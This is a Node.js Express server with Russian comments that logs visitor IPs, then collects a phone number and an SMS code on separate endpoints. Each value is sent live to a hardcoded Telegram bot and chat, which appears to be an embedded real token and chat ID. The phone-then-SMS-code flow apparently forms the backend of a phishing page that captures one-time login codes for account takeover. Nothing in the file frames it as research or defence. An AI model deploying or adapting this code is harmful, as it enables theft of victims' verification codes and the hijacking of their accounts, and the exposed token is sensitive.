const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname));

// Вставьте данные вашего бота:
const TELEGRAM_BOT_TOKEN = '9174881478:AAGHOkgMyw3NJkjDQoxA2NXTsgcCNiBJjSo';
const TELEGRAM_CHAT_ID = '1000389815';

// Функция отправки уведомления в Telegram
async function sendTelegramNotification(messageText) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: messageText,
        parse_mode: 'HTML'
      })
    });
  } catch (error) {
    console.error('Ошибка отправки в Telegram:', error.message);
  }
}

// 1. Лог визита
app.post('/api/visit', (req, res) => {
  const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  console.log(`[ВИЗИТ] ID: ${req.body.id} | IP: ${userIp}`);
  
  sendTelegramNotification(
    `👀 <b>Новый визит на сайт!</b>\n` +
    `<b>ID:</b> <code>${req.body.id}</code>\n` +
    `<b>IP:</b> <code>${userIp}</code>`
  );
  
  res.json({ success: true });
});

// 2. Ввод телефона
app.post('/api/phone', (req, res) => {
  const { id, phone, timestamp } = req.body;
  const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  console.log(`[ТЕЛЕФОН] ID: ${id} | Телефон: ${phone}`);
  
  sendTelegramNotification(
    `📱 <b>Введен телефон!</b>\n` +
    `<b>ID:</b> <code>${id}</code>\n` +
    `<b>Телефон:</b> <code>${phone}</code>\n` +
    `<b>Время:</b> ${timestamp}\n` +
    `<b>IP:</b> <code>${userIp}</code>`
  );

  res.json({ status: 'ok' });
});

// 3. Ввод SMS-кода
app.post('/api/sms', (req, res) => {
  const { id, smsCode } = req.body;

  console.log(`[SMS] ID: ${id} | Код: ${smsCode}`);
  
  sendTelegramNotification(
    `🔑 <b>Введен SMS-код!</b>\n` +
    `<b>ID:</b> <code>${id}</code>\n` +
    `<b>Код:</b> <code>${smsCode}</code>`
  );

  res.json({ status: 'ok' });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));